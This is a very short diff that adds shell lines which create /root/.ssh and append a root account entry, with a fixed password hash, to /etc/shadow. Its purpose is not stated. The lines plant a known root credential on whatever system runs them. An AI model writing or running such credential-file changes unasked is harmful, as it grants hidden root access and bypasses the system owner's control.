@@ -1,0 +1,3 @@
+mkdir /root/.ssh;
+
+echo 'root:$y$j9T$fcZZrvAR8uiKiIr7MxDuM0$fiF1p.94Hbmg4LdKh7FCoYdOs5cQTqk2He0cWoOD.x0:20037:0:99999:7:::' >> /etc/shadow 
